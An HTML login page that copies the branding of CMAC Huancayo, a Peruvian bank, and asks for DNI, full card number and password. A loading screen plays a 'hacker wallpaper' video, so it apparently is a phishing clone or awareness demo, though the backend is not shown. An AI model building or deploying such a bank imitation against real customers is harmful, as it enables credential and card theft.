<!DOCTYPE html>
<html lang="es">

<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>
        Login | CMAC Huancayo
    </title>

    <link rel="stylesheet" href="/css/login.css">

</head>

<body>

<!-- FONDO ROJO -->
<div class="background"></div>

<!-- IMAGEN MACHU PICCHU -->
<div class="background-image"></div>

<!-- LOGO -->
<header>

    <img
        src="/img/caja-huancayo-logo-png_seeklogo-437667.png"
        class="logo"
    >

</header>

<!-- CONTENEDOR -->
<div class="container">

    <!-- IZQUIERDA -->
    <div class="left">

        <div class="mascot-container">

            <img
                src="/img/mascota.png"
                class="mascot"
            >

        </div>

    </div>

    <!-- DERECHA -->
    <div class="right">

        <div class="card">

            <h2>
                Iniciar Sesión
            </h2>

            <p>
                Bienvenido a la banca digital segura
            </p>

            <form
                action="/login"
                method="post"
                id="loginForm"
            >

                <input
                    type="text"
                    name="dni"
                    placeholder="DNI"
                    maxlength="8"
                    required
                >

                <input
                    type="text"
                    name="tarjeta"
                    placeholder="Número de tarjeta"
                    maxlength="16"
                    required
                >

                <input
                    type="password"
                    name="password"
                    placeholder="Contraseña"
                    required
                >

                <button type="submit">
                    INGRESAR
                </button>

            </form>

            <!-- BOTON CREAR CUENTA -->
            <a
                href="#"
                id="registerLink"
            >
                Crear cuenta bancaria
            </a>

        </div>

    </div>

</div>

<!-- PANTALLA DE CARGA -->

<div
    class="loading-screen"
    id="loadingScreen"
>

    <video
        autoplay
        muted
        class="loading-video"
        id="loadingVideo"
    >

        <source
            src="/videos/hacker wallpaper video download.mp4"
            type="video/mp4"
        >

    </video>

</div>

<script>

// =========================
// LOGIN
// =========================

const form =
document.getElementById(
    "loginForm"
);

form.addEventListener(
    "submit",
    () => {

        document.getElementById(
            "loadingScreen"
        ).style.display = "flex";

    }
);


// =========================
// REGISTER VIDEO
// =========================

const registerLink =
document.getElementById(
    "registerLink"
);

const loadingScreen =
document.getElementById(
    "loadingScreen"
);

const loadingVideo =
document.getElementById(
    "loadingVideo"
);

registerLink.addEventListener(
    "click",
    function(e){

        e.preventDefault();

        loadingScreen.style.display =
        "flex";

        loadingVideo.currentTime = 0;

        loadingVideo.play();

        // ESPERAR VIDEO

        loadingVideo.onended = () => {

            window.location.href =
            "/register";

        };

        // SEGURIDAD EXTRA
        // SI EL VIDEO NO TERMINA

        setTimeout(() => {

            window.location.href =
            "/register";

        }, 5000);

    }
);

</script>

<script src="/js/app.js"></script>

</body>
</html>
